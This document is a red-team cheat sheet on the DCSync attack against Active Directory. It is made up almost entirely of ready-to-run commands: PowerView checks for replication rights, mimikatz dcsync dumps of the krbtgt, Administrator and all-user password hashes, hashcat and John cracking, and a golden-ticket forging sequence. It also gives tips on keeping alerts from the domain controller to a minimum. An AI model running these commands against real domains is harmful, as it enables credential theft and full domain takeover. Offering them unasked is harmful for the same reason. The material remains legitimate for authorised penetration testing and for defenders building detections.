# DCSync Attack

!!! tip "Tip"
    DCSync requires `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights — typically Domain Admins, Enterprise Admins, or explicitly delegated accounts. Use `mimikatz lsadump::dcsync /user:krbtgt` to dump the krbtgt hash for golden tickets.

!!! warning "Watch out"
    DCSync generates Event ID 4662 on the DC. On monitored environments, this will alert. Do it once, get what you need, stop.

---

## Requirements

- Domain Admin or Enterprise Admin, OR
- Any account with **Replicating Directory Changes** and **Replicating Directory Changes All** rights on the domain object

---

## Step 1: Check for Replication Permissions

### With PowerView

```powershell
Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "Replicating" }
```

### With BloodHound

```cypher
Find all principals with DCSync rights
```

---

## Step 2: Run DCSync with Mimikatz

### Dump `krbtgt` Hash

```mimikatz
lsadump::dcsync /domain:corp.local /user:krbtgt
```

### Dump `Administrator` Hash

```mimikatz
lsadump::dcsync /domain:corp.local /user:Administrator
```

### Dump All Users (Heavy Noise)

```mimikatz
lsadump::dcsync /domain:corp.local /all
```

### Dump Across Trusted Domain

```mimikatz
lsadump::dcsync /domain:child.corp.local /user:svc_sql
```

---

## Output Example

```text
SAM Username : krbtgt
NTLM        : 1693c6cefafffc7af11ef34d1c788f47
```

Once you have the NTLM hash:

- Use it for Golden Ticket attacks (krbtgt)
- Use it for Pass-the-Hash (Administrator)
- Crack it offline if needed

---

## Step 3: Crack the Hash (Optional)

```bash
hashcat -m 1000 krbtgt.hash rockyou.txt
```

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt krbtgt.hash
```

---

## Practical Flow (From Admin Shell)

```powershell
privilege::debug
lsadump::dcsync /domain:corp.local /user:krbtgt
kerberos::golden /krbtgt:<hash> /domain:corp.local /sid:S-1-5-21-xxx... /user:admin /ptt
```

